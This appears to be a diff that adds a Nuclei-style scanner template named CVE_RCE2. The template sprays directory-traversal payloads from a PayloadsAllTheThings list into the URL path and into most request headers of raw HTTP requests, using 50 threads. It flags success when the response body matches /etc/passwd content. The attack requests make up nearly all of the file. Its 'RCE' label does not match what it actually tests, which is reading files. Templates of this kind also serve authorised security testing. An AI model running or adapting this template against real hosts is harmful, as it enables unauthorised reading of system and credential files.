@@ -1,0 +1,51 @@
+id: CVE_RCE2-1
+info:
+  author: 0x240x23elu
+  name: CVE_RCE2
+  severity: high
+requests:
+- attack: sniper
+  matchers:
+  - part: body
+    regex:
+    - 'root:[x*]:0:0:'
+    type: regex
+  payloads:
+    dirt: /mnt/d/tools/alltest/myopen/payload/PayloadsAllTheThings/DirectoryTraversal/Intruder/traversals-8-deep-exotic-encoding.txt
+  raw:
+  - "GET /\xA7dirt\xA7 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows\
+    \ NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nReferer: {{BaseURL}}\n\
+    Connection: keep-alive\nTE: Trailers\nAccept: */*\nAccept-Encoding: */*\nAccept-Language\
+    \ : */*\nConnection: */*\nUpgrade-Insecure-Requests: 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: \xA7dirt\xA7\nReferer: {{BaseURL}}\n\
+    Connection: keep-alive\nTE: Trailers\nAccept: */*\nAccept-Encoding: */*\nAccept-Language\
+    \ : */*\nConnection: */*\nUpgrade-Insecure-Requests: 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
+    \ Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nAccept-Encoding: gzip, deflate,\
+    \ br\nReferer: \xA7dirt\xA7\nConnection: keep-alive\nTE: Trailers\nAccept: */*\n\
+    Accept-Encoding: */*\nAccept-Language : */*\nConnection: */*\nUpgrade-Insecure-Requests:\
+    \ 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
+    \ Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nAccept-Encoding: gzip, deflate,\
+    \ br\nReferer: {{BaseURL}}\nConnection: \xA7dirt\xA7\nTE: Trailers\nAccept: */*\n\
+    Accept-Encoding: */*\nAccept-Language : */*\nConnection: */*\nUpgrade-Insecure-Requests:\
+    \ 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
+    \ Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nAccept-Encoding: gzip, deflate,\
+    \ br\nReferer: {{BaseURL}}\nConnection: keep-alive\nTE: \xA7dirt\xA7\nAccept:\
+    \ */*\nAccept-Encoding: */*\nAccept-Language : */*\nConnection: */*\nUpgrade-Insecure-Requests:\
+    \ 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
+    \ Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nAccept-Encoding: gzip, deflate,\
+    \ br\nReferer: {{BaseURL}}\nConnection: keep-alive\nTE: Trailers\nAccept: \xA7\
+    dirt\xA7\nAccept-Encoding: */*\nAccept-Language : */*\nConnection: */*\nUpgrade-Insecure-Requests:\
+    \ 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
+    \ Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nReferer: {{BaseURL}}\nConnection:\
+    \ keep-alive\nTE: Trailers\nAccept: */*\nAccept-Encoding: \xA7dirt\xA7\nAccept-Language\
+    \ : */*\nConnection: */*\nUpgrade-Insecure-Requests: 1\n"
+  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
+    \ Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\nReferer: {{BaseURL}}\nConnection:\
+    \ keep-alive\nTE: Trailers\nAccept: */*\nAccept-Encoding: */*\nAccept-Language:\
+    \ \xA7dirt\xA7\nUpgrade-Insecure-Requests: 1\n"
+  threads: 50
